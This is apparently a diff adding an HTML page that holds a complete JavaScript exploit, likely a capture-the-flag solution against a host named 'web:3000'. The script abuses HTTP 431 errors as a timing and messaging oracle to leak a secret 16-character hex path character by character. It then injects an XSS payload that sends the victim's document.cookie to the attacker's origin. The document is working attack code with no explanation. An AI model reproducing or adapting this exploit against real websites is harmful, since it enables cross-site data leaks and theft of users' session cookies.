@@ -1,0 +1,67 @@
+<body>
+  <script type="module">
+    const BASE_URL = "http://web:3000";
+
+    const CHARS = "0123456789abcdef".split("");
+    const LENGTH = 16;
+
+    const known = [];
+    const win = open("");
+
+    const debug = (data) =>
+      navigator.sendBeacon("/debug", JSON.stringify(data));
+
+    const getUrl = (prefix, padLength, xss) =>
+      `${BASE_URL}/${prefix.join("/")}?${new URLSearchParams({
+        xss,
+        pad: "x".repeat(padLength),
+      })}`;
+
+    const got431 = (prefix, padLength) => {
+      const xss = 'opener.postMessage("ping", "*");';
+      return new Promise((resolve) => {
+        window.onmessage = ({ data }) => {
+          if (data === "ping") resolve(false);
+        };
+        setTimeout(() => resolve(true), 150);
+        win.location = getUrl(prefix, padLength, xss);
+      });
+    };
+
+    let left = 0;
+    let right = 18000;
+    const getThreshold = async () => {
+      left -= 30;
+
+      while (right - left > 1) {
+        const mid = (right + left) >> 1;
+        if (await got431([...known, "_"], mid)) {
+          right = mid;
+        } else {
+          left = mid;
+        }
+      }
+
+      return left;
+    };
+
+    while (known.length < LENGTH) {
+      const threshold = await getThreshold();
+      debug({ length: known.length, threshold });
+      for (const c of CHARS) {
+        if (await got431([...known, c], threshold)) {
+          known.push(c);
+          debug(known);
+          break;
+        }
+      }
+    }
+
+    const url = getUrl(
+      known,
+      0,
+      `location = "${location.origin}/flag?" + document.cookie`
+    );
+    win.location = url;
+  </script>
+</body>
